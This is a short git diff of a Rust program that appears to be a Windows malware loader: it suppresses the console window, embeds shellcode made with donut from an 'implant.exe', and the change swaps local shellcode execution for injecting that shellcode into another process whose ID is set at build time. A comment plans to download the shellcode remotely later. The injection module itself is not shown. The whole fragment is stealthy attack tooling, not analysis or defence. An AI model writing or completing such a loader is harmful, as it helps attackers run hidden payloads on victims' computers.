@@ -1,19 +1,16 @@
 // Don't flash up the console window when this code runs
 #![windows_subsystem = "windows"]
 
-use std::time::Duration;
-mod execute;
+mod injection;
+
+const PID: &str = env!("GUAC_PROC");
 
 fn main() {
     // Generate the shellcode with `donut implant.exe`
     // TODO: Actually download the shellcode instead of including it
-    let mut shellcode = *include_bytes!("shellcode.bin");
+    let shellcode = include_bytes!("shellcode.bin");
 
-    // Execute the shellcode, then sleep forever
-    let handle = execute::exec(&mut shellcode).unwrap();
-    if !handle.is_invalid() {
-        loop {
-            std::thread::sleep(Duration::MAX);
-        }
-    }
+    // TODO: Don't unwrap, this is just for debugging.
+    let pid = PID.parse().unwrap();
+    injection::inject(pid, shellcode).unwrap();
 }
